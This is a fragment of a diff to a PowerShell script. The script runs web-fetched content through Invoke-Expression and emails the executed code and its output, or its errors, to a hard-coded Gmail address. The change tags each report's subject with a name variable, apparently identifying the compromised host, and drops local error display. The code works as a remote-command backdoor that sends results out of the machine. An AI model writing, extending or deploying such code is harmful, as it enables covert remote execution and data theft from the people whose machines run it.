@@ -36,11 +36,11 @@ if ($statusCode -eq 200){
     if($diff) {
         try {
             $runn = & Invoke-Expression $contentWeb 2>&1 | Out-String
-            if($?){ $res=$contentWeb + "`n" + $runn; Send-ToEmail -email "xelil.isi007@gmail.com" -body $res -subj "Done"}
+            if($?){ $res=$contentWeb + "`n" + $runn; $don = "Done - "+$name; Send-ToEmail -email "xelil.isi007@gmail.com" -body $res -subj $don }
         } catch {
             $err = $_ | Out-String
-            write-host $err
-            Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj "Error"
+            $suberr = "Error - "+$name
+            Send-ToEmail -email "xelil.isi007@gmail.com" -body $err -subj $suberr
         }
     }
 } else {
